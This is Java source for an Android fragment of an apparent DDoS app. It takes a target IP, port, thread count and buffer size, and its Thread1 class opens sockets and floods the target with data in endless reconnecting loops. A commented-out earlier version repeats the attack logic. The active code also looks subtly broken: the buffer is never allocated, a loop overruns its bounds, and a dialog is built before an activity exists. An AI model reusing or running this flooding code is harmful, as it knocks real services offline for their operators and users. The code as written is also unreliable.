package com.greyCloud.ddos;


import android.app.AlertDialog;
import android.app.ProgressDialog;
import android.content.DialogInterface;
import android.os.Bundle;
import android.os.Handler;
import android.support.annotation.Nullable;
import android.support.design.widget.TextInputEditText;
import android.support.v4.app.Fragment;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.TextView;

import java.io.DataOutputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.util.concurrent.Callable;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.FutureTask;

public class PageFragment extends Fragment {

    //信息部分
    public static byte[] buffer;//缓存区
    public static String ip;//目标服务器的ip
    public static int port;//             端口
    public static long killNum=0;//当前死亡的线程数量，每一秒清空一次
    public static long alive=0;//现在存活的线程
    public static boolean isStart=false;//是否开始
    public static int threadNum=0;//线程总数
    public static int bufferSize=0;//缓存大小
    public static boolean flag=false;//错误记号
    public static String Thread_info="";//多线程投递过来的信息

    //组件部分
    AlertDialog Warningdialog;//警告的对话框，定义一个环保
    final ProgressDialog progress = new ProgressDialog(getActivity());

    /*
    ProgressDialog pd;



    boolean lock=false;
    Handler uiHandler = new Handler();

    Thread1[] threadPool=null;

    boolean stop=true;
    public static int buffSize=0;
    public static int tN=0;
    String err="";
    int jd=0;
    ProgressDialog pd1;
     */

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
    }

    @Override
    public void onActivityCreated(Bundle a) {
        super.onActivityCreated(a);

        //初始化我们的警告对话框
        Warningdialog = new AlertDialog.Builder(getActivity()).setNegativeButton("确定", new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                dialog.dismiss();//就一个按钮，点完没事了
            }
        }).create();

        //下面开始绑定按钮事件，同时也是本软件的核心部分
        Button btn_start = (Button) getView().findViewById(R.id.btn_start);
        Button btn_stop = (Button) getView().findViewById(R.id.btn_stop);
        btn_stop.setOnClickListener(new View.OnClickListener() {//停止事件
            @Override
            public void onClick(View v) {
                if(!isStart){
                    Warningdialog.setTitle("警告");
                    Warningdialog.setMessage("当前没有在执行攻击,请点击“开始攻击”按钮发起攻击");
                    Warningdialog.show();
                    return;
                }
                isStart=false;//归位
                ((LinearLayout) getView().findViewById(R.id.infoLayout)).setVisibility(View.GONE);//隐藏回去
            }
        });
        btn_start.setOnClickListener(new View.OnClickListener() {//开始事件
            @Override
            public void onClick(View v) {
                if(isStart){
                    Warningdialog.setTitle("警告");
                    Warningdialog.setMessage("当前正在攻击,请先点击“停止攻击”按钮终止");
                    Warningdialog.show();
                    return;
                }
                //判断ip是否正确
                String[] arr_ip= ((EditText) getView().findViewById(R.id.info_ip)).getText().toString().split(":");
                Warningdialog.setTitle("警告");
                Warningdialog.setMessage("你的ip格式有误，请填写“ip:端口”这种形式，中间的冒号为半角符号（即英文符号），如“127.0.0.1:25565”");
                if(arr_ip.length!=2){
                    Warningdialog.show();
                    return;
                }

                try{
                    port=Integer.parseInt(arr_ip[1]);
                }catch(Exception e){
                    flag=true;
                }
                if(flag){
                    Warningdialog.show();
                    return;
                }
                ip=arr_ip[0];
                try{
                    threadNum=Integer.parseInt(((EditText) getView().findViewById(R.id.info_thread)).getText().toString());
                    bufferSize=Integer.parseInt(((EditText) getView().findViewById(R.id.info_buffer)).getText().toString());
                }catch(Exception e){
                    flag=true;
                }
                if(flag){
                    Warningdialog.setTitle("警告");
                    Warningdialog.setMessage("你的缓存大小或线程数量填写的并非数字，或是数字过大，暂不支持填除正整数以外的其他整数");
                    Warningdialog.show();
                    return;
                }

                //然后还没完，我们填充缓存，填充时有错误也是要报错的，我们开线程来进行
                progress.setTitle("正在处理");
                progress.setProgressStyle(ProgressDialog.STYLE_HORIZONTAL);//设置对话进度条样式为水平
                progress.getWindow().setGravity(Gravity.CENTER);//居中

                FutureTask<Integer> futureTask = new FutureTask<>(new Callable<Integer>() {
                    @Override
                    public Integer call() throws Exception {
                        progress.setProgress(0);//归位
                        progress.setMessage("正在创建缓存");//设置提示信息
                        progress.setMax(bufferSize);
                        progress.show();//调用show方法显示进度条对话框
                        for(int i=0;i<bufferSize*1024;i++){
                            for(int a=0;a<1024;a++) {
                                PageFragment.buffer[i*1024+a] = 123;
                            }
                            progress.setProgress(i+1);
                        }
                        //填完就轮到我们的线程了
                        progress.setMessage("正在释放线程");
                        progress.setMax(threadNum);
                        progress.setProgress(0);//归位
                        progress.show();
                        for(int i=0;i<threadNum;i++){
                            Thread.sleep(1000);
                            progress.setProgress(i+1);
                        }
                        return 0;
                    }
                });
                Thread thread = new Thread(futureTask);
                thread.start();
                try {
                    futureTask.get();
                } catch (InterruptedException e) {
                    e.printStackTrace();
                } catch (ExecutionException e) {
                    flag = true;
                    Thread_info = e.getMessage();
                }
                if(flag){
                    Warningdialog.setTitle("警告");
                    Warningdialog.setMessage("释放线程或创建缓存时出错，错误信息："+Thread_info+"\n在保证操作正确的情况下依然报错，请联系作者，Email：753707290@qq.com（24小时内回复）");
                    Warningdialog.show();
                    return;
                }
                //采用上面的方法可以捕获线程内的异常，恰好又符合我们的情境
                progress.dismiss();
                ((LinearLayout) getView().findViewById(R.id.infoLayout)).setVisibility(View.VISIBLE);//把隐藏部分显示出来
                isStart=true;
                //至此，这个按钮的使命结束
            }
        });


        /*

        //监听button事件
        pd = new ProgressDialog(getActivity());
        pd1 = new ProgressDialog(getActivity());

        btn2.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                if (!lock) {
                    dialog.setTitle("警告");
                    dialog.setMessage("当前没有在执行攻击");
                    dialog.show();
                    return;
                }
                pd1.setProgressStyle(ProgressDialog.STYLE_HORIZONTAL);// 设置水平进度条
                pd1.setCancelable(false);// 设置是否可以通过点击Back键取消
                pd1.setCanceledOnTouchOutside(false);// 设置在点击Dialog外是否取消Dialog进度条
                //dialog.setIcon(R.drawable.ic_launcher);// 设置提示的title的图标，默认是没有的
                pd1.setTitle("正在终止...");
                pd1.setMax(threadPool.length);
                pd1.setMessage("等待线程退出...");
                pd1.show();
                stop s = new stop(threadPool.length);
                s.start();
                lock = false;
                stop = false;
            }

            class stop extends Thread {
                int l = 0;

                public stop(int l) {
                    this.l = l;
                }

                @Override
                public void run() {
                    for (int i = 0; i < l; i++) {
                        try {
                            threadPool[i].s.close();
                        } catch (Exception e) {
                        }
                        threadPool[i].interrupt();
                        jd = i;
                        Runnable runnable = new Runnable() {
                            @Override
                            public void run() {
                                //pd1.setMessage(String.valueOf(jd));
                                pd1.incrementProgressBy(jd);
                            }
                        };
                        uiHandler.post(runnable);
                    }
                    Runnable runnable = new Runnable() {
                        @Override
                        public void run() {
                            pd1.cancel();
                            killN = 0;
                            h = 0;
                            jd = 0;
                            ((LinearLayout) getView().findViewById(R.id.ll)).setVisibility(View.GONE);
                        }
                    };
                    uiHandler.post(runnable);
                }
            }
        });
        btn1.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                if (lock) {
                    dialog.setTitle("警告");
                    dialog.setMessage("当前攻击正在执行");
                    dialog.show();
                    return;
                }
                pd.setProgressStyle(ProgressDialog.STYLE_SPINNER);
                pd.setCanceledOnTouchOutside(false);
                pd.setMessage("初始化...");
                pd.show();
                lock = true;
                LinearLayout ll;
                EditText ip = null;
                EditText thread = null;
                EditText buff = null;
                TextView kill;
                boolean astop = false;
                try {
                    ll = (LinearLayout) getView().findViewById(R.id.ll);
                    kill = (TextView) getView().findViewById(R.id.killThread);
                    ip = (EditText) getView().findViewById(R.id.ip);
                    buff = (EditText) getView().findViewById(R.id.buff);
                    thread = (EditText) getView().findViewById(R.id.thread);
                    kill.setText("正在攻击，线程死亡速度:0个/s\n存活线程:0");
                } catch (Exception e) {
                    pd.cancel();
                    dialog.setTitle("错误");
                    dialog.setMessage("初始化失败：" + e.getMessage());
                    dialog.show();
                    astop = true;
                }
                if (astop) {
                    lock = false;
                    return;
                }
                String[] temp = ip.getText().toString().split(":");
                if (temp.length != 2) {
                    pd.cancel();
                    dialog.setTitle("错误");
                    dialog.setMessage("ip格式错误");
                    dialog.show();
                    astop = true;
                }
                if (astop) {
                    lock = false;
                    return;
                }
                ipS = temp[0];
                try {
                    buffSize = Integer.parseInt(buff.getText().toString());
                } catch (Exception e) {
                    pd.cancel();
                    dialog.setTitle("错误");
                    dialog.setMessage("缓冲大小错误");
                    dialog.show();
                    astop = true;
                }
                if (astop) {
                    lock = false;
                    return;
                }
                port = Integer.parseInt(temp[1]);
                tN = Integer.parseInt(thread.getText().toString());
                Thread2 t = new Thread2();
                t.start();
            }

            class Thread2 extends Thread {
                @Override
                public void run() {
                    try {
                        buffer = new byte[1024 * buffSize];
                        for (int i = 0; i < 1024 * buffSize; i++) {
                            buffer[i] = 127;
                        }
                    } catch (Exception e) {
                        err = e.getMessage();
                        Runnable runnable = new Runnable() {
                            @Override
                            public void run() {
                                pd.cancel();
                                dialog.setTitle("错误");
                                dialog.setMessage("创建缓冲区时发生错误：" + err);
                                dialog.show();
                            }
                        };
                        uiHandler.post(runnable);
                        return;
                    }
                    Runnable runnable = new Runnable() {
                        @Override
                        public void run() {
                            pd.setMessage("正在释放线程...");
                        }
                    };
                    uiHandler.post(runnable);
                    try {
                        threadPool = new Thread1[tN];
                        for (int i = 0; i < tN; i++) {
                            //Runnable thread1 = new Thread1();
                            Thread1 thread2 = new Thread1();
                            threadPool[i] = thread2;
                            threadPool[i].start();
                        }
                    } catch (Exception e) {
                        err = e.getMessage();
                        Runnable runnable2 = new Runnable() {
                            @Override
                            public void run() {
                                pd.cancel();
                                dialog.setTitle("错误");
                                dialog.setMessage("释放线程时发生错误：" + err);
                                dialog.show();
                            }
                        };
                        uiHandler.post(runnable2);
                        return;
                    }
                    th t = new th();
                    t.start();
                    Runnable runnable1 = new Runnable() {
                        @Override
                        public void run() {
                            pd.cancel();

                        }
                    };
                    uiHandler.post(runnable1);
                }
            }

            class th extends Thread {
                @Override
                public void run() {
                    while (true) {
                        if (!lock) {
                            break;
                        }
                        try {
                            Thread.sleep(1000);
                        } catch (Exception e) {

                        }
                        Runnable runnable = new Runnable() {
                            @Override
                            public void run() {
                                TextView kill = (TextView) getView().findViewById(R.id.killThread);
                                kill.setText("正在攻击，线程死亡速度:" + killN + "个/s\n存活线程:" + h);
                                killN = 0;
                            }
                        };
                        uiHandler.post(runnable);
                    }
                }
            }
        });
         */
    }

    @Nullable
    @Override
    public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState) {
        //View view = inflater.inflate(R.layout.fragment_welcome, container, false);
        //TextView textView = (TextView) view;
        //textView.setText("Fragment #" + mPage);

        View view=inflater.inflate(R.layout.fragment_ddos2, container, false);;
        return view;
    }

}
class Thread1 extends Thread{
    public Socket s=null;
    @Override
    public void run(){
        OutputStream os=null;
        DataOutputStream dos=null;
        while(!isInterrupted()){
            try {
                s=new Socket(PageFragment.ip,PageFragment.port);
                PageFragment.alive++;
                //流准备
                //s.setSoTimeout(
                os=s.getOutputStream();
                dos=new DataOutputStream(os);
                while(!isInterrupted()) {
                    dos.write(PageFragment.buffer);
                    dos.flush();
                }
            }catch(Exception e) {
                //PageFragment.kill.setText("正在攻击，当前已死亡线程:"+PageFragment.killN);
                ///uiHandler.post(runnable1);
                //System.out.println("线程死亡，重生！"+e.getMessage());
                //Runnable thread1 = new Thread1(); 
            }
            PageFragment.killNum++;
            PageFragment.alive--;
        }
    }
}
